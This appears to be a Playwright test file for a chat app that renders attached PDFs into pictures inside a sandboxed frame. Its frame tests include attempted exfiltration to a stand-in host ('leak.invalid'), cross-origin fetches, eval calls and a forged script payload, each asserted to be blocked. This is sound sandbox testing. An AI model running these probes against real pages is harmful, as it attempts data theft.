// A PDF's pages and a picture's fitted copy (read-attachment PAGES_01, readAttachment flag, D-071): real PDFs and PNGs
// built in the test (chat-attach-pages-fixtures.ts), the real frame and pdf.js, a fake agent. What came out is read
// from the page's own uploads, and what the agent is told from its prompt. A script run inside the frame while
// it works stands for a PDF that broke pdf.js: it reaches nothing, and what it hands back is dropped.
import type { Frame, Page, Request } from '@playwright/test';
import type { ChatServer } from './chat-server.ts';
import { startChatServer } from './chat-server.ts';
import { CHINESE, KOREAN, pdf, png, RED_JP2, redPicture, UNREADABLE } from './chat-attach-pages-fixtures.ts';
import { expect, expectNoAxeViolations, test } from './helpers.ts';
import { side, text, toggle } from './chat-page.ts';

test.describe.configure({ mode: 'serial', timeout: 120_000 });

let srv: ChatServer;
let runs = 0;

test.beforeAll(async () => { srv = await startChatServer(); });
test.afterAll(async () => { await srv.close(); });

declare const BOARD: string; // in the probe's worker
declare function importScripts(url: string): void;
const composer = (page: Page) => side(page).locator('chat-composer');
const chip = (page: Page, name: string) => composer(page).locator('.chat-chip[data-kind="file"]').filter({ hasText: name });
const FRAME = 'iframe[data-vb-pdf-frame]';
const PDF = 'application/pdf';
const file = (name: string, buffer: Buffer, mimeType = PDF) => ({ name, mimeType, buffer });

interface Copy { of: { path: string; page?: number; pages?: number }; bytes: Buffer }
/** Every copy the page uploads, as it goes; the saved answer is waited for through `settled`. */
function watchCopies(page: Page) {
  const copies: Copy[] = [];
  page.on('request', (req: Request) => {
    if (!req.url().endsWith('/api/chat/files')) return;
    const body = req.postDataJSON() as { data: string; of?: Copy['of'] };
    if (body.of) copies.push({ of: body.of, bytes: Buffer.from(body.data, 'base64') });
  });
  return copies;
}

async function open(page: Page, flags = '') {
  await page.goto(`${srv.base}/${flags && `?flags=${flags}`}`);
  if (!(await side(page).isVisible())) await toggle(page).click();
  await expect(text(page)).toBeVisible();
}

async function attach(page: Page, ...files: ReturnType<typeof file>[]) {
  const chooser = page.waitForEvent('filechooser');
  await side(page).getByRole('button', { name: 'Attach files' }).click();
  await (await chooser).setFiles(files);
}

/** Send what is attached and read what the agent was told. */
async function sent(page: Page, words = 'Read this') {
  await text(page).fill(words);
  await text(page).press('Enter');
  return (await srv.fake.run(++runs)).prompt;
}

/** A PNG's size and the colour at its middle, as a browser reads it. */
const look = (page: Page, bytes: Buffer) => page.evaluate(async (b64) => {
  const data = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
  const bitmap = await createImageBitmap(new Blob([data]));
  const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
  const draw = canvas.getContext('2d', { willReadFrequently: true })!;
  draw.drawImage(bitmap, 0, 0);
  const all = draw.getImageData(0, 0, bitmap.width, bitmap.height).data;
  let dark = 0;
  for (let i = 0; i < all.length; i += 4) if (all[i]! < 128) dark++;
  const middle = draw.getImageData(bitmap.width >> 1, bitmap.height >> 1, 1, 1).data;
  return { width: bitmap.width, height: bitmap.height, dark, middle: [...middle].slice(0, 3) };
}, bytes.toString('base64'));
const isRed = ([r, g, b]: number[]) => r! > 180 && g! < 80 && b! < 80;

test('a one-page PDF: the chip says it reads, then ready; the agent is told the page and to open it; the frame is gone', async ({ page }) => {
  const copies = watchCopies(page);
  await open(page);
  await attach(page, file('design.pdf', pdf([{ text: 'Network diagram' }])));
  const c = chip(page, 'design.pdf');
  await expect(c).toHaveAttribute('data-state', 'ready');
  await expect.poll(() => copies.length).toBe(1);
  await expect(c.locator('.chat-chip-s')).toHaveCount(0);
  await expect(page.locator(FRAME)).toHaveCount(0);
  expect(copies[0]!.of).toMatchObject({ page: 1, pages: 1 });
  const seen = await look(page, copies[0]!.bytes);
  expect(Math.max(seen.width, seen.height)).toBeLessThanOrEqual(2000);
  expect(seen.dark, 'the text was drawn').toBeGreaterThan(50);
  const lines = (await sent(page)).split('\n');
  const at = lines.findIndex((l) => /^\.visionboard\/attachments\/[^/]+\/\d+-design\.pdf$/.test(l));
  expect(lines[at + 1]).toMatch(/^ {2}Its pages as pictures, 1 of 1: \.visionboard\/attachments\/[^/]+\/\d+-design-pages\/page-001-of-001\.png to page-001-of-001\.png$/);
  expect(lines[at + 2]).toContain('Open the pictures named under a file');
  expect(lines[at + 3]).toContain('untrusted');
});

test('a 40-page PDF: 30 pictures, the chip counts them and says so at the end, and the agent is told 30 of 40', async ({ page }) => {
  const copies = watchCopies(page);
  const release = await holdCopies(page, (of) => of.page === 12); // small pages go by faster than a look at them: this one waits
  await open(page);
  await attach(page, file('long.pdf', pdf(Array.from({ length: 40 }, () => ({})))));
  const c = chip(page, 'long.pdf');
  await expect(c.locator('.chat-chip-s')).toHaveText('Reading pages… 12 of 30');
  await expect(composer(page).getByRole('status')).toContainText('Reading pages…');
  release();
  await expect(c.locator('.chat-chip-why')).toHaveText('The agent gets 30 of its 40 pages as pictures.', { timeout: 60_000 });
  await expect(composer(page).getByRole('status')).toContainText('30 of its 40 pages');
  expect(copies.map((x) => x.of.page)).toEqual(Array.from({ length: 30 }, (_, i) => i + 1));
  expect(new Set(copies.map((x) => x.of.pages))).toEqual(new Set([40]));
  await expect(page.locator(FRAME)).toHaveCount(0);
  await expectNoAxeViolations(page);
  const prompt = await sent(page);
  expect(prompt).toMatch(/Its pages as pictures, 30 of 40: \S+\/page-001-of-040\.png to page-030-of-040\.png/);
  expect(prompt.split('\n').filter((l) => l.includes('page-')), 'a folder and a count, not 30 lines').toHaveLength(1);
});

test('a PDF with only a picture on its page reaches the agent as that picture; so does one in JPEG 2000, a scanner\'s format', async ({ page }) => {
  const copies = watchCopies(page);
  await open(page);
  await attach(page, file('scan.pdf', pdf([{ image: redPicture(60, 80) }])), file('jpx.pdf', pdf([{ image: { width: 16, height: 16, filter: 'JPXDecode', bytes: RED_JP2 } }])));
  await expect.poll(() => copies.length, { timeout: 30_000 }).toBe(2);
  for (const copy of copies) expect(isRed((await look(page, copy.bytes)).middle), copy.of.path).toBe(true);
  await expect.poll(() => page.locator(FRAME).count()).toBe(0);
  await sent(page);
});

test('CJK in a font the PDF doesn\'t embed draws, by a predefined CMap inside the frame, with no network', async ({ page }) => {
  const copies = watchCopies(page);
  await open(page);
  await attach(page, file('chinese.pdf', pdf([{ font: CHINESE }])), file('korean.pdf', pdf([{ font: KOREAN }])));
  await expect.poll(() => copies.length, { timeout: 30_000 }).toBe(2);
  for (const copy of copies) expect((await look(page, copy.bytes)).dark, copy.of.path).toBeGreaterThan(200);
  await expect.poll(() => page.locator(FRAME).count()).toBe(0);
  await expect(composer(page).locator('.chat-chip-why')).toHaveCount(0);
  await sent(page);
});

test('a page with text that drew nothing says the picture may be incomplete; the file still goes', async ({ page }) => {
  await open(page);
  await attach(page, file('unreadable.pdf', pdf([{ font: UNREADABLE }])));
  const c = chip(page, 'unreadable.pdf');
  await expect(c.locator('.chat-chip-why')).toContainText('may be incomplete', { timeout: 15_000 });
  await expect(c).toHaveAttribute('data-state', 'ready');
  await sent(page);
});

test('a corrupt PDF and one with a password say so on the chip, and the PDF itself still goes', async ({ page }) => {
  const copies = watchCopies(page);
  await open(page);
  await attach(page, file('broken.pdf', Buffer.from('%PDF-1.5 this is not one')), file('locked.pdf', pdf([{}], { encrypted: true })));
  const broken = chip(page, 'broken.pdf');
  await expect(broken).toHaveAttribute('data-note');
  await expect(broken.locator('.chat-chip-why')).toContainText('damaged');
  await expect(broken).toHaveAttribute('data-state', 'ready');
  await expect(chip(page, 'locked.pdf').locator('.chat-chip-why')).toContainText('it has a password');
  await expect(page.locator(FRAME)).toHaveCount(0);
  await expectNoAxeViolations(page);
  const prompt = await sent(page);
  expect(prompt).toMatch(/\d+-broken\.pdf/);
  expect(prompt).toMatch(/\d+-locked\.pdf/);
  expect(prompt).not.toContain('pictures');
  expect(copies).toEqual([]);
});

/** The frame while it works: the first upload of a copy is held, so the frame waits there. */
async function heldFrame(page: Page, body: Buffer): Promise<{ frame: Frame; release(): void }> {
  let release = () => {};
  const gate = new Promise<void>((resolve) => { release = resolve; });
  await page.route('**/api/chat/files', async (route) => {
    if ((route.request().postDataJSON() as { of?: unknown }).of) await gate;
    await route.continue();
  });
  await open(page);
  await attach(page, file('hostile.pdf', body));
  await expect(page.locator(FRAME)).toHaveCount(1);
  await expect.poll(() => page.frames().length).toBeGreaterThan(1);
  await expect(chip(page, 'hostile.pdf').locator('.chat-chip-s')).toContainText('1 of 2');
  return { frame: page.frames().find((f) => f !== page.mainFrame())!, release };
}

test.describe('what runs in the frame', () => {
  // Each refusal the browser logs is the point, and this is the only place they are expected.
  test.use({ expected: { problems: [/Content Security Policy|Content-Security-Policy/, /sandbox/i, /Unsafe attempt/, /Failed to load resource/, /request failed: GET .*(leak|example\.invalid)/, /WebSocket connection/, /cross-origin frame/i, /^request failed: \S+ \S+ \(csp\)$/] } });

  test('a script there reaches no network, no board, no storage and no eval; a PDF\'s own script does not run', async ({ page }) => {
    const asked: string[] = [];
    const answered: string[] = [];
    page.on('request', (r) => asked.push(r.url()));
    page.on('response', (r) => answered.push(r.url()));
    const { frame, release } = await heldFrame(page, pdf([{}, {}], { script: 'app.alert(1); this.submitForm("http://leak.invalid/")' }));
    const base = srv.base;
    const tried = await frame.evaluate(async (board) => {
      const out: Record<string, string> = {};
      const attempt = async (name: string, go: () => unknown) => {
        try { const v = await go(); out[name] = `reached: ${String(v).slice(0, 60)}`; } catch (e) { out[name] = `refused: ${(e as Error).name}`; }
      };
      await attempt('fetch here', () => fetch('/api/project?probe'));
      await attempt('fetch board', () => fetch(`${board}/api/project?probe`));
      await attempt('xhr', () => new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.onload = () => resolve('loaded'); x.onerror = () => reject(new TypeError('blocked')); x.open('GET', `${board}/api/project?probe`); x.send(); }));
      await attempt('parent.document', () => parent.document.title);
      await attempt('top.location read', () => top!.location.href);
      await attempt('top.location write', () => { top!.location.href = 'http://leak.invalid/'; return 'no throw'; });
      await attempt('localStorage', () => localStorage.length);
      await attempt('sessionStorage', () => sessionStorage.length);
      await attempt('cookie', () => document.cookie);
      await attempt('indexedDB', () => new Promise((resolve, reject) => { const r = indexedDB.open('x'); r.onsuccess = () => resolve('opened'); r.onerror = () => reject(r.error ?? new TypeError('no')); }));
      await attempt('eval', () => (0, eval)('1 + 1'));
      await attempt('Function', () => new Function('return 1')());
      await attempt('image', () => new Promise((resolve, reject) => { const i = new Image(); i.onload = () => resolve('loaded'); i.onerror = () => reject(new TypeError('blocked')); i.src = `${board}/favicon.svg?probe`; }));
      await attempt('script', () => new Promise((resolve, reject) => { const s = document.createElement('script'); s.onload = () => resolve('loaded'); s.onerror = () => reject(new TypeError('blocked')); s.src = `${board}/favicon.svg?probe`; document.head.append(s); }));
      await attempt('socket', () => new Promise((resolve, reject) => { const w = new WebSocket(board.replace('http', 'ws')); w.onopen = () => resolve('open'); w.onerror = () => reject(new TypeError('blocked')); }));
      await attempt('popup', () => { if (!window.open('http://leak.invalid/')) throw new TypeError('blocked'); return 'opened'; });
      navigator.sendBeacon(`${board}/api/project?probe`, 'x'); // says "queued" whatever then happens: the server's log below decides
      return { out, origin: origin };
    }, base);
    expect(answered.filter((u) => u.includes('probe')), 'no answer reached the frame, the beacon\'s included').toEqual([]);
    expect(tried.origin, 'no origin').toBe('null');
    for (const [name, what] of Object.entries(tried.out)) expect(what, name).toMatch(/^refused/);
    expect(asked.filter((u) => u.includes('leak.invalid'))).toEqual([]);
    release();
    await expect.poll(() => page.locator(FRAME).count(), { timeout: 15_000 }).toBe(0);
  });

  test('where a file is really read, a worker in the frame, script has no WebRTC, no way to navigate, no network and no storage', async ({ page }) => {
    const { frame, release } = await heldFrame(page, pdf([{}, {}]));
    const said = await frame.evaluate((board) => new Promise<Record<string, string>>((resolve, reject) => {
      const probe = async () => {
        const out: Record<string, string> = { rtc: typeof RTCPeerConnection, document: typeof document, window: typeof window, navigate: typeof (location as { assign?: unknown }).assign };
        const attempt = async (name: string, go: () => unknown) => {
          try { await go(); out[name] = 'reached'; } catch (e) { out[name] = `refused: ${(e as Error).name}`; }
        };
        await attempt('fetch', () => fetch(`${BOARD}/api/project`));
        await attempt('socket', () => new Promise((ok, no) => { const w = new WebSocket(BOARD.replace('http', 'ws')); w.onopen = ok; w.onerror = () => no(new TypeError('blocked')); }));
        await attempt('importScripts', () => importScripts(`${BOARD}/favicon.svg`));
        await attempt('eval', () => (0, eval)('1'));
        await attempt('indexedDB', () => new Promise((ok, no) => { const r = indexedDB.open('x'); r.onsuccess = ok; r.onerror = () => no(r.error ?? new TypeError('no')); }));
        postMessage(out);
      };
      const script = `const BOARD = ${JSON.stringify(board)}; (${String(probe)})();`;
      const worker = new Worker(URL.createObjectURL(new Blob([script], { type: 'text/javascript' })));
      worker.onmessage = (e) => resolve(e.data as Record<string, string>);
      worker.onerror = () => reject(new Error('the probe did not start'));
    }), srv.base);
    expect(said).toMatchObject({ rtc: 'undefined', document: 'undefined', window: 'undefined', navigate: 'undefined' });
    for (const name of ['fetch', 'socket', 'importScripts', 'eval', 'indexedDB']) expect(said[name], name).toMatch(/^refused/);
    release();
  });

  test('what it hands back is dropped unless it is the page asked for, a whole PNG, within the limits; the frame can\'t leave for another site', async ({ page }) => {
    const copies = watchCopies(page);
    const asked: string[] = [];
    page.on('request', (r) => asked.push(r.url()));
    const { frame, release } = await heldFrame(page, pdf([{}, {}]));
    await expect.poll(() => copies.length).toBe(1); // page 1, its save held: the page asks for nothing until it is saved
    await frame.evaluate(async (good) => {
      const whole = Uint8Array.from(atob(good), (c) => c.charCodeAt(0));
      const post = (m: unknown) => parent.postMessage(m, '*');
      post({ kind: 'page', page: 2, png: whole.slice().buffer }); // not the page asked
      post({ kind: 'page', page: 99, png: whole.slice().buffer });
      post({ kind: 'page', page: 2, png: new TextEncoder().encode('<script>alert(1)</script>').buffer }); // not a PNG
      post({ kind: 'page', page: 2, png: new ArrayBuffer(6 * 1024 * 1024) }); // too big
      post('not even an object');
      post({ kind: 'opened', pages: 1e12 });
      await new Promise((r) => setTimeout(r, 300));
    }, png(10, 10).toString('base64'));
    await page.waitForTimeout(200);
    expect(copies.length, 'nothing new was saved').toBe(1);
    await frame.evaluate(() => { location.href = 'http://leak.invalid/?stolen=bytes'; }).catch(() => {});
    await page.waitForTimeout(300);
    expect(asked.filter((u) => u.includes('leak.invalid')), 'the page\'s frame-src stops it').toEqual([]);
    release();
  });
});

test('a message may go while pages are read: the agent is told only what is saved; the work stops, and a removed chip stops it too', async ({ page }) => {
  const copies = watchCopies(page);
  const { release } = await heldFrame(page, pdf([{}, {}]));
  const prompt = await sent(page);
  expect(prompt).toMatch(/\d+-hostile\.pdf/);
  expect(prompt, 'the page still held was not saved').not.toContain('Its pages as pictures');
  await expect(page.locator(FRAME)).toHaveCount(0);
  await expect(composer(page).locator('.chat-chip[data-kind="file"]')).toHaveCount(0);
  await page.unrouteAll({ behavior: 'ignoreErrors' });
  release();
  await attach(page, file('removed.pdf', pdf([{}, {}, {}])));
  await chip(page, 'removed.pdf').getByRole('button', { name: 'Remove removed.pdf' }).click();
  await expect(page.locator(FRAME)).toHaveCount(0);
  expect(copies.length).toBeLessThanOrEqual(2);
});

test('a 3000 px picture and a 6 MB picture each get a fitted copy; a small one gets none; the agent is told to open the copy', async ({ page }) => {
  const copies = watchCopies(page);
  await open(page);
  const heavy = png(1500, 1400, 'noise');
  expect(heavy.length).toBeGreaterThan(6 * 1024 * 1024);
  await attach(page, file('wide.png', png(3000, 200), 'image/png'), file('heavy.png', heavy, 'image/png'), file('small.png', png(40, 40), 'image/png'));
  await expect.poll(() => copies.length, { timeout: 30_000 }).toBe(2);
  await expect.poll(() => page.locator(FRAME).count(), { timeout: 15_000 }).toBe(0);
  for (const copy of copies) {
    const seen = await look(page, copy.bytes);
    expect(copy.of.page).toBeUndefined();
    expect(Math.max(seen.width, seen.height)).toBeLessThanOrEqual(2000);
    expect(copy.bytes.length).toBeLessThanOrEqual(5 * 1024 * 1024);
  }
  const prompt = await sent(page);
  expect(prompt).toMatch(/\d+-wide\.png\n {2}A copy that fits: \S+\/\d+-wide-fitted\/fitted\.png/);
  expect(prompt).toMatch(/\d+-heavy\.png\n {2}A copy that fits: \S+\/\d+-heavy-fitted\/fitted\.jpg/);
  expect(prompt).toMatch(/\d+-small\.png\n(?! {2})/);
});

test('flag off: attaching is as it was, with no frame, no copy, and nothing more in the prompt', async ({ page }) => {
  const copies = watchCopies(page);
  await open(page, '-readAttachment');
  await attach(page, file('off.pdf', pdf([{}])));
  await expect(chip(page, 'off.pdf')).toHaveAttribute('data-state', 'ready');
  await page.waitForTimeout(200);
  await expect(page.locator(FRAME)).toHaveCount(0);
  const prompt = await sent(page);
  expect(copies).toEqual([]);
  expect(prompt).not.toContain('Open the pictures');
});

test('the page\'s bundle carries no pdf.js, and the frame\'s page alone gets no origin and takes no ask', async ({ page }) => {
  const bodies: Promise<string>[] = [];
  page.on('response', (res) => { if (/\.js(\?|$)/.test(res.url())) bodies.push(res.text()); });
  await open(page);
  expect((await Promise.all(bodies)).map((js) => js.includes('GlobalWorkerOptions'))).not.toContain(true);
  const answer = await page.goto(`${srv.base}/pdf-frame`);
  expect(answer!.headers()['content-security-policy']).toMatch(/^sandbox allow-scripts; default-src 'none'; script-src 'sha256-[^']+' 'wasm-unsafe-eval'; img-src data: blob:; worker-src blob:/);
  expect(answer!.headers()['content-security-policy']).toContain("connect-src 'none'");
  expect(await page.evaluate(() => origin)).toBe('null');
});

test('a short window: the eleventh file\'s reason reads whole, the box is there, and the feed keeps its share however long the words', async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 420 });
  await open(page);
  await attach(page, ...Array.from({ length: 11 }, (_, i) => file(`scan-${i + 1}.txt`, Buffer.from('x'), 'text/plain')));
  const reason = composer(page).locator('.chat-chip[data-state="refused"] .chat-chip-why');
  await expect(reason).toContainText('at most 10 files');
  await text(page).fill('A long message.\n'.repeat(30));
  const panel = (await side(page).locator('.chat-panel').boundingBox())!;
  const [feed, box, list, why] = await Promise.all([side(page).locator('chat-feed').boundingBox(), composer(page).locator('.chat-cmp-box').boundingBox(), composer(page).locator('.chat-chips').boundingBox(), reason.boundingBox()]);
  expect(feed!.height / panel.height, 'the feed keeps its share').toBeGreaterThanOrEqual(0.19);
  expect(box!.y + box!.height, 'the box is inside the panel').toBeLessThanOrEqual(panel.y + panel.height);
  expect(why!.y, 'the reason starts in the list').toBeGreaterThanOrEqual(list!.y);
  expect(why!.y + why!.height, 'and ends in it').toBeLessThanOrEqual(list!.y + list!.height + 1);
  await text(page).fill('');
  await side(page).locator('chat-composer .chat-chip-x').first().focus();
  await expectNoAxeViolations(page);
  await composer(page).locator('.chat-chip[data-state="refused"] .chat-chip-x').click();
  await expect(reason).toHaveCount(0);
});

const sendButton = (page: Page) => composer(page).getByRole('button', { name: 'Send', exact: true });
const line = (page: Page) => composer(page).locator('.chat-cmp-line');
/** Hold each upload of a copy that `which` picks, until the returned release. */
async function holdCopies(page: Page, which: (of: Copy['of']) => boolean) {
  let release = () => {};
  const gate = new Promise<void>((resolve) => { release = resolve; });
  await page.route('**/api/chat/files', async (route) => {
    const { of } = route.request().postDataJSON() as { of?: Copy['of'] };
    if (of && which(of)) await gate;
    await route.continue().catch(() => {});
  });
  return release;
}

test('Send waits for a fitted copy and the line says why; then the agent is told the copy', async ({ page }) => {
  const release = await holdCopies(page, (of) => of.page === undefined);
  await open(page);
  await attach(page, file('photo.png', png(1500, 1400, 'noise'), 'image/png'));
  const c = chip(page, 'photo.png');
  await expect(c.locator('.chat-chip-s')).toHaveText('Fitting…');
  await expect(c).toHaveAttribute('data-state', 'ready');
  await expect(line(page)).toHaveText('Send waits until a copy of the picture that fits is ready.');
  await text(page).fill('Look at this');
  await expect(sendButton(page)).toBeDisabled();
  await text(page).press('Enter');
  await page.waitForTimeout(100);
  expect(srv.fake.given().length, 'nothing went').toBe(runs);
  await expect(text(page)).toHaveValue('Look at this');
  release();
  await expect(sendButton(page)).toBeEnabled({ timeout: 15_000 });
  await expect(line(page)).toContainText('Enter');
  expect(await sent(page)).toMatch(/\d+-photo\.png\n {2}A copy that fits: \S+-photo-fitted\/fitted\./);
});

test('a picture within the limits holds nothing and gets no frame; a PDF ahead holds no picture, and a long PDF holds no Send', async ({ page }) => {
  const asked: string[] = [];
  page.on('request', (r) => asked.push(r.url()));
  const release = await holdCopies(page, (of) => of.page !== undefined);
  await open(page);
  await attach(page, file('small.png', png(40, 40), 'image/png'));
  await expect(sendButton(page)).toBeEnabled();
  expect(asked.filter((u) => u.endsWith('/pdf-frame'))).toEqual([]);
  await attach(page, file('long.pdf', pdf([{}, {}, {}])));
  await expect(chip(page, 'long.pdf').locator('.chat-chip-s')).toContainText('1 of 3');
  await expect(sendButton(page)).toBeEnabled();
  await attach(page, file('wide.png', png(3000, 200), 'image/png'));
  await expect(sendButton(page)).toBeEnabled({ timeout: 15_000 }); // the copy was made with the PDF's page still held
  expect(await sent(page)).toMatch(/\d+-wide\.png\n {2}A copy that fits:/);
  release();
});

test.describe('a copy that can\'t be saved', () => {
  test.use({ expected: { problems: [/^response 409: POST \S*\/api\/chat\/files/, /Failed to load resource/] } });

  test('Send frees, the chip says so, and the original goes', async ({ page }) => {
    await page.route('**/api/chat/files', async (route) => {
      if (!(route.request().postDataJSON() as { of?: unknown }).of) return route.continue();
      return route.fulfill({ status: 409, contentType: 'application/problem+json', body: JSON.stringify({ type: 'about:blank', title: 'Conflict', status: 409, code: 'conflict', detail: 'No.' }) });
    });
    await open(page);
    await attach(page, file('refused.png', png(3000, 200), 'image/png'));
    const c = chip(page, 'refused.png');
    await expect(c.locator('.chat-chip-why')).toContainText('It still goes as it is', { timeout: 15_000 });
    await expect(sendButton(page)).toBeEnabled();
    const prompt = await sent(page);
    expect(prompt).toMatch(/\d+-refused\.png/);
    expect(prompt).not.toContain('A copy that fits');
  });
});
